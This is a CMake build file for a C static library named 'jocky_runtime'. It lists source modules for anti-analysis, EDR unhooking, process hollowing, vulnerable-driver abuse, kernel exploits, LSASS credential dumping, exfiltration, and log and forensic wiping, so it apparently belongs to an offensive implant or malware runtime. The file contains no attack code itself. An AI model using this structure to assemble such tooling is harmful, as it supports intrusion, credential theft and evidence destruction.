cmake_minimum_required(VERSION 3.16)
project(jocky_runtime C)

set(CMAKE_C_STANDARD 11)

# Runtime source files
set(RUNTIME_SOURCES
    init/anti_analysis.c
    util/mem.c
    evasion/unhook.c
    evasion/syscalls.c
    evasion/stack_spoof.c
    execution/hollow.c
    execution/linux_hollow.c
    execution/inmem.c
    execution/byovd.c
    execution/driver_interact.c
    execution/linux_modules.c
    exploitation/kernel_exploit.c
    exploitation/linux_kernel.c
    exfil/exfil.c
    exfil/lsass_dump.c
    cleanup/self_delete.c
    cleanup/logs.c
    cleanup/forensics.c
    pack/stub_loader.c
    io/io.c
    memory/vmem.c
    registry/registry.c
    linux/syscall.c
    linux/sysinfo_syscall.c
    linux/process_syscall.c
    linux/env_syscall.c
    linux/file_syscall.c
    linux/dir_syscall.c
)

# Platform-specific filtering
if(NOT WIN32)
    # Remove Windows-only sources on Linux (keep linux_hollow.c, linux_modules.c)
    list(REMOVE_ITEM RUNTIME_SOURCES
        evasion/unhook.c
        evasion/syscalls.c
        evasion/stack_spoof.c
        execution/hollow.c
        execution/inmem.c
        execution/byovd.c
        execution/driver_interact.c
        exploitation/kernel_exploit.c
        exfil/exfil.c
        exfil/lsass_dump.c
        cleanup/forensics.c
        pack/stub_loader.c
        registry/registry.c
    )
endif()

# Static library
add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
target_include_directories(jocky_rt PUBLIC include)

if(WIN32)
    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
else()
    # Linux: link against libdl for dlopen/dlsym
    target_link_libraries(jocky_rt PUBLIC dl)
endif()

# Example: build a test executable
# add_executable(rt_test tests/rt_test.c)
# target_link_libraries(rt_test jocky_rt)
